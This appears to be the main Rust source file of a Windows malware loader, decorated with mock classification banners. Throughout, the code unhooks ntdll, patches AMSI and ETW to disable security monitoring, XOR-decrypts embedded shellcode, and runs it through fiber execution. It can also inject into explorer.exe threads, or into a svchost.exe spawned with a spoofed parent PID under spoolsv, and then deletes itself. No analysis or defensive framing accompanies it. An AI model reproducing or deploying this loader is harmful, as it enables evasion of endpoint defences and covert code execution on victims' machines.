/*********************************************************************************
                            --- SECRET//NOFORN ---
**********************************************************************************/

mod suicide;
mod spoof_proc;
mod find_remote;
mod remote_fiber;
mod get_privs;

use std::{
    ffi::c_void,
    mem::{self, size_of},
    ptr::{self, copy_nonoverlapping, null_mut},
    vec::Vec,
};

use ntapi::{
    ntldr::LDR_DATA_TABLE_ENTRY,
    ntpebteb::PEB,
};

use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};

use windows::{
    core::{s, Error, PCSTR, PSTR, Result},
    Win32::System::{
        Diagnostics::Debug::{WriteProcessMemory, ReadProcessMemory},
        LibraryLoader::{GetProcAddress, LoadLibraryA},
        Memory::{
            VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE,
            PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
            GetProcessHeap, HeapAlloc, HeapFree, HEAP_ZERO_MEMORY, HEAP_FLAGS,
        },
        Threading::{
            ConvertThreadToFiber, CreateFiber, GetCurrentProcess, SwitchToFiber,
            CreateProcessA, STARTUPINFOA, PROCESS_INFORMATION, CREATE_SUSPENDED,
        },
    },
};

fn main() -> Result<()> {
    unsafe {
        // parse cli args
        let args: Vec<String> = std::env::args().collect();
        let mode = if args.len() > 1 {
            args[1].as_str()
        } else {
            "/l" // default to local fiber
        };

        // check if spoofing flag
        let use_spoofing = args.iter().any(|arg| arg == "/s");
        // check if delete flag
        let use_delete = args.iter().any(|arg| arg == "/d");

        // enable SeDebugPrivilege if admin
        let _is_admin = is_admin::is_admin();

        if _is_admin {
            match get_privs::enable_debug_privilege() {
                Ok(_) => {},
                Err(_) => println!("Failed: 210"),
            }
        } else {
            println!("Failed: 211");
        }

        // unhook ntdll
        // benign process
        let process = b"C:\\Windows\\System32\\calc.exe\0";
        let module = get_ntdll_address();

        // create process in suspended state
        let si = STARTUPINFOA { cb: size_of::<STARTUPINFOA>() as u32, ..Default::default() };
        let mut pi = PROCESS_INFORMATION::default();

        CreateProcessA(
            None,
            Some(PSTR(process.as_ptr() as *mut u8)),
            None, None, false, CREATE_SUSPENDED, None, None, &si, &mut pi,
        )?;
        // read clean DOS header
        let mut remote_dos: IMAGE_DOS_HEADER = mem::zeroed();
        let mut bytes_read = 0usize;
        ReadProcessMemory(
            pi.hProcess,
            module.cast(),
            &mut remote_dos as *mut _ as *mut c_void,
            size_of::<IMAGE_DOS_HEADER>(),
            Some(&mut bytes_read),
        )?;

        if remote_dos.e_magic != IMAGE_DOS_SIGNATURE {
            panic!("Failed: 101");
        }

        let nt_hdr_addr = (module as usize + remote_dos.e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
        let mut remote_nt: IMAGE_NT_HEADERS64 = mem::zeroed();
        ReadProcessMemory(
            pi.hProcess,
            nt_hdr_addr.cast(),
            &mut remote_nt as *mut _ as *mut c_void,
            size_of::<IMAGE_NT_HEADERS64>(),
            Some(&mut bytes_read),
        )?;
        // allocate memory in process for clean ntdll
        let image_size = remote_nt.OptionalHeader.SizeOfImage as usize;
        let heap = GetProcessHeap().unwrap();
        let buffer_ntdll = HeapAlloc(heap, HEAP_ZERO_MEMORY, image_size) as *mut c_void;

        ReadProcessMemory(
            pi.hProcess,
            module.cast(),
            buffer_ntdll,
            image_size,
            Some(&mut bytes_read),
        )?;
        // find .text in clean copy
        let section_base = (nt_hdr_addr as usize + size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER;
        let mut text_local: *mut c_void = null_mut();
        let mut text_clean: *mut c_void = null_mut();
        let mut text_size: usize = 0;

        for i in 0..remote_nt.FileHeader.NumberOfSections {
            let sec = section_base.add(i as usize);
            let name = std::str::from_utf8(&(*sec).Name).unwrap_or("").trim_end_matches('\0');

            if name == ".text" {
                text_local = (module as usize + (*sec).VirtualAddress as usize) as *mut c_void;
                text_clean = (buffer_ntdll as usize + (*sec).VirtualAddress as usize) as *mut c_void;
                text_size = *(*sec).Misc.VirtualSize() as usize;
                break;
            }
        }

        if text_local.is_null() {
            panic!("Failed: 228");
        }
        // temporarily make .text writable
        let mut old = PAGE_PROTECTION_FLAGS(0);
        VirtualProtect(text_local, text_size, PAGE_EXECUTE_READWRITE, &mut old)?;
        // overwrite hooked ntdll with clean
        std::ptr::copy_nonoverlapping(text_clean as *const u8, text_local as *mut u8, text_size);
        // restore protection
        VirtualProtect(text_local, text_size, old, &mut old)?;

        let _ = HeapFree(heap, HEAP_FLAGS(0), Some(buffer_ntdll));

        // patch AMSI
        let patch_opcode = 0x75u8;
        let h_module = LoadLibraryA(s!("amsi.dll"))?;
        let amsi_scan_buffer = GetProcAddress(h_module, PCSTR(b"AmsiScanBuffer\0".as_ptr()))
            .ok_or_else(|| Error::from_thread())? as *const u8;
        let bytes = std::slice::from_raw_parts(amsi_scan_buffer, 0x1000);
        let pattern = [0xC3, 0xCC, 0xCC];
        let mut patch_addr: *mut u8 = ptr::null_mut();
        if let Some(pos) = bytes.windows(3).position(|w| w == pattern) {
            // walk backwards looking for 'je' (0x74)
            for i in (0..pos).rev() {
                if bytes[i] == 0x74 {
                    // calculate jump target
                    let offset = bytes[i + 1] as i8;
                    let target = i as isize + 2 + offset as isize;

                    // verify target is "mov eax, 0" (0xB8)
                    if bytes.get(target as usize) == Some(&0xB8) {
                        patch_addr = amsi_scan_buffer.add(i) as *mut u8;
                        break;
                    }
                }
            }
        }
        if patch_addr.is_null() {
            panic!("Failed: 319");
        }
        let mut old_protect = PAGE_PROTECTION_FLAGS(0);
        // make page writable
        VirtualProtect(
            patch_addr.cast::<std::ffi::c_void>(),
            1,
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        )?;
        // apply patch
        *patch_addr = patch_opcode;
        // restore protection
        VirtualProtect(
            patch_addr.cast::<std::ffi::c_void>(),
            1,
            old_protect,
            &mut old_protect,
        )?;

        // patch ETW
        let h_ntdll = LoadLibraryA(s!("ntdll.dll"))?;
        let nt_trace_addr = GetProcAddress(h_ntdll, PCSTR(b"NtTraceEvent\0".as_ptr()))
            .ok_or_else(|| Error::from_thread())? as *const c_void;

        let handle = GetCurrentProcess();
        let ret_opcode: u8 = 0xC3; // ret opcode
        let size = mem::size_of_val(&ret_opcode);
        let mut bytes_written: usize = 0;

        WriteProcessMemory(
            handle,
            nt_trace_addr,
            &ret_opcode as *const u8 as *const c_void,
            size,
            Some(&mut bytes_written as *mut usize),
        )?;

        // load shellcode and decrypt at runtime
        let encrypted_shellcode: &[u8] = include_bytes!("enc_shellcode.bin");
        let key = b"Gdb1p_dnbp1DD@#";
        let mut shellcode: Vec<u8> = Vec::with_capacity(encrypted_shellcode.len());
        for (i, &byte) in encrypted_shellcode.iter().enumerate() {
            shellcode.push(byte ^ key[i % key.len()]);
        }

        // execute based on mode
        match mode {
            "/l" => {
                // LOCAL FIBER
                if _is_admin {
                    println!("[+] Initialized");
                }
                println!("[+] Loading ... (this may take a while)");

                // convert current thread to fiber
                let main_fiber = ConvertThreadToFiber(None);
                if main_fiber.is_null() {
                    panic!("Failed: 862");
                }

                // allocate memory as RW
                let shellcode_size = shellcode.len();
                let shellcode_mem = VirtualAlloc(
                    None,
                    shellcode_size,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_READWRITE
                );
                if shellcode_mem.is_null() {
                    panic!("Failed: 472");
                }

                // write shellcode to memory
                copy_nonoverlapping(shellcode.as_ptr(), shellcode_mem as *mut u8, shellcode.len());

                // change mem protection to RX
                let mut old_protect = PAGE_PROTECTION_FLAGS(0);
                VirtualProtect(
                    shellcode_mem,
                    shellcode_size,
                    PAGE_EXECUTE_READ,
                    &mut old_protect,
                )?;

                // create fiber w/ shellcode addr as entry
                type FiberStartRoutine = unsafe extern "system" fn(*mut c_void);
                let shellcode_func: FiberStartRoutine = std::mem::transmute(shellcode_mem);
                let shellcode_fiber = CreateFiber(0, Some(shellcode_func), None);
                if shellcode_fiber.is_null() {
                    panic!("Failed: 543");
                }

                // transfer execution to shellcode
                SwitchToFiber(shellcode_fiber);
                // may not reach
                if use_delete {
                    let _ = suicide::delete_self();
                }
            }

            "/r" => {
                // REMOTE FIBER
                
                // if admin, spoof PPID
                let mut spoofing_successful = false;

                if _is_admin && use_spoofing {
                    // find spoof parent
                    if let Some(parent_pid) = find_remote::find_target_pid("spoolsv") {
                        // spawn child with parent
                         match spoof_proc::spawn_spoofed_process(parent_pid, "C:\\Windows\\System32\\svchost.exe") {
                            Ok(pi) => {
                                // use new for injection
                                let h_process = pi.hProcess;
                                let h_thread = pi.hThread;

                                match remote_fiber::hijack_thread_with_fiber(h_process, h_thread, &shellcode) {
                                     Ok(_) => {
                                         println!("[+] Success!");
                                         let _ = windows::Win32::Foundation::CloseHandle(h_thread);
                                         let _ = windows::Win32::Foundation::CloseHandle(h_process);
                                         spoofing_successful = true;
                                     },
                                     Err(_e) => {
                                         println!("Failed: 1001");
                                         let _ = windows::Win32::System::Threading::TerminateProcess(h_process, 0);
                                     }
                                }
                            },
                            Err(_e) => {
                                println!("Failed: 1002");
                            }
                        }
                    } else {
                        println!("[-] Spoolsv not found!");
                    }
                }
                
                // if spoof worked, suicide and exit
                if spoofing_successful {
                    if use_delete {
                        let _ = suicide::delete_self();
                    }
                    return Ok(());
                }

                // if spoof did not work, fallback
                if _is_admin {
                     println!("[+] Initialized!");
                }

                // find target process (explorer)
                let target_pid = match find_remote::find_target_pid("explorer") {
                    Some(pid) => pid,
                    None => panic!("Failed: 901"),
                };

                // enum all threads in target process
                let thread_ids = find_remote::find_all_remote_thread_ids(target_pid);
                if thread_ids.is_empty() {
                    panic!("Failed: 902");
                }

                // open process handle once
                let h_process = remote_fiber::open_target_process(target_pid)?;
                let mut injection_success = false;

                // try each thread until one succeeds
                for (_idx, &thread_id) in thread_ids.iter().enumerate() {
                    let h_thread = match remote_fiber::open_target_thread(thread_id) {
                        Ok(handle) => handle,
                        Err(_) => continue,
                    };

                    match remote_fiber::hijack_thread_with_fiber(h_process, h_thread, &shellcode) {
                        Ok(_) => {
                            let _ = remote_fiber::close_thread_handle(h_thread);
                            injection_success = true;
                            break;
                        }
                        Err(_e) => {
                            let _ = remote_fiber::close_thread_handle(h_thread);
                            continue;
                        }
                    }
                }

                let _ = remote_fiber::close_process_handle(h_process);

                if !injection_success {
                    panic!("Failed: 903");
                }

                // attempt self-delete
                if use_delete {
                    let _ = suicide::delete_self();
                }
            }

            _ => {
                panic!("Failed: 900");
            }
        }
    }
    Ok(())
}

// get base address of ntdll.dll by walking PEB → Ldr linked list
fn get_ntdll_address() -> *mut c_void {
    unsafe {
        let peb = NtCurrentPeb();
        let first = (*(*peb).Ldr).InLoadOrderModuleList.Flink;
        let ntdll_entry = (*first).Flink as *const LDR_DATA_TABLE_ENTRY;
        (*ntdll_entry).DllBase.cast()
    }
}

// grab PEB pointer
#[inline(always)]
#[allow(non_snake_case)]
unsafe fn NtCurrentPeb() -> *const PEB {
    #[cfg(target_arch = "x86_64")]
    {
        let peb: usize;
        core::arch::asm!("mov {}, gs:[0x60]", out(reg) peb, options(nostack, preserves_flags));
        peb as *const PEB
    }
}

/*********************************************************************************
                            --- SECRET//NOFORN ---
**********************************************************************************/